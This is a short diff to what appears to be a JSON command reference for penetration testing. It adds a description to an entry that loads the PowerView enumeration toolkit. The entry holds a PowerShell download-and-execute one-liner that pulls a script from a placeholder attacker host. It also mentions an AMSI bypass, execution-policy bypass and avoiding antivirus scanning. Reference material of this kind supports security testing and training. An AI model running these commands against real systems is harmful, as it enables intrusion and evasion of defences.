@@ -192,7 +192,8 @@
   "variations": [
     {
       "label": "Load fileless (after AMSI bypass)",
-      "command": "iex (New-Object Net.WebClient).DownloadString('http://<attacker>/PowerView.ps1')"
+      "command": "iex (New-Object Net.WebClient).DownloadString('http://<attacker>/PowerView.ps1')",
+      "description": "Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning."
     }
   ],
   "explain": "Loads the PowerView enumeration toolkit into the session:\n  Import-Module .\\PowerView.ps1   make the Get-Domain*/Find-*/Invoke-* cmdlets available\nRequired before any PowerView command; run 'powershell -ep bypass' first if the execution policy blocks it, or load it fileless with IEX (New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1') to avoid touching disk."
